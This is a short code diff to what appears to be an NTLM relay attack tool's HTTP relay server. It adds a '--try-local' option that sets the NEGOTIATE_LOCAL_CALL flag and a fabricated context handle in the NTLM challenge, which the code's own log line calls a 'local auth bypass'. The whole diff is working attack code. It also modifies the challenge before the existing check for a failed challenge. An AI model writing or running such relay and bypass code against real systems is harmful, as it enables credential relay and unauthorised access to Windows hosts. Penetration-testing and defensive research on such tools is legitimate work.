@@ -317,6 +317,18 @@ class HTTPRelayServer(Thread):
                     self.challengeMessage['TargetInfoFields_len'] = len(av_pairs.getData())
                     self.challengeMessage['TargetInfoFields_max_len'] = len(av_pairs.getData())
 
+                # When --try-local is enabled, modify Type 2 to trigger local auth
+                if self.server.config.try_local:
+                    LOG.info("(HTTP): --try-local enabled in relay mode, setting NEGOTIATE_LOCAL_CALL flag")
+                    # Set the NEGOTIATE_LOCAL_CALL flag (0x00004000)
+                    NTLMSSP_NEGOTIATE_LOCAL_CALL = 0x00004000
+                    self.challengeMessage['flags'] |= NTLMSSP_NEGOTIATE_LOCAL_CALL
+                    # Set a fake context handle in the Context field
+                    # The client validates this, so we need something that looks valid
+                    # For local auth, we use a non-zero value
+                    self.challengeMessage['context'] = b'\x01\x02\x03\x04\x05\x06\x07\x08'
+                    LOG.info("(HTTP): Set NEGOTIATE_LOCAL_CALL flag and context handle for local auth bypass")
+
                 # Check for errors
                 if self.challengeMessage is False:
                     return False
